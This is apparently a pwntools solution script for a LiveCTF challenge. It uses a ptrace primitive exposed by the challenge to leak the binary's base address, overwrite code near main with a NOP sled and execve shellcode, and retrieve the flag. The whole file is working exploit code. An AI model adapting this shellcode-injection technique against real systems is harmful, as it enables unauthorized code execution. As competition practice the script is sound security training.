#!/usr/bin/env python3
from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]
uu64 = lambda x: u64(x.ljust(8,b'\0')[:8])

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

exe = context.binary = ELF('./handout/challenge')
# libc = exe.libc

if args.REMOTE:
    io = remote(HOST, PORT)
    print = lambda *a, **kw: None
else:
    io = process(exe.path)
    if args.PAUSE:
        pause()

PROMPT = b'?\n'
def send(s, endl = False, recv = True):
    if type(s) != bytes:
        if type(s) != str:
            s = f'{s}\n'
        s = s.encode()
    if endl and s[-1] != ord('\n'):
        s += b'\n'
    if PROMPT and recv:
        io.recvuntil(PROMPT)
    io.send(s)

def ptrace(req, addr = 0, data = 0, cont = 1):
    send(int(req), True)
    send(hex(addr), True)
    send(hex(data), True)
    leak = int(io.readline().decode().strip().split()[-1], 16)
    send(cont)
    return leak

exe.address = ptrace(constants.PTRACE_PEEKUSER, 1 * 8, 0) - 0x3d68
info(f'exe.address = {hex(exe.address)}')
# libc.address = ptrace(constants.PTRACE_PEEKUSER, 10 * 8, 0) - 0xeabc7
# info(f'libc.address = {hex(libc.address)}')

# for i in range(64):
#     leak = ptrace(constants.PTRACE_PEEKUSER, i * 8, 0)
#     print(i, hex(leak))

binary = './submitter'
code = shellcraft.execve(binary, [binary], [])
print(code)
payload = asm('nop') * 16 + asm(code)
print(len(payload))
print(disasm(payload))

addr = exe.sym.main + 87
addr -= addr % 8

for idx, data in enumerate(split(payload, 8)):
    data = uu64(data)
    wr = addr + idx * 8
    print(hex(wr), hex(data))
    ptrace(constants.PTRACE_POKETEXT, wr, data)

ptrace(constants.PTRACE_PEEKUSER, 0, 0, 0)

# if not args.REMOTE:
#     io.interactive()
# else:
#     io.sendline()
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
success(flag)

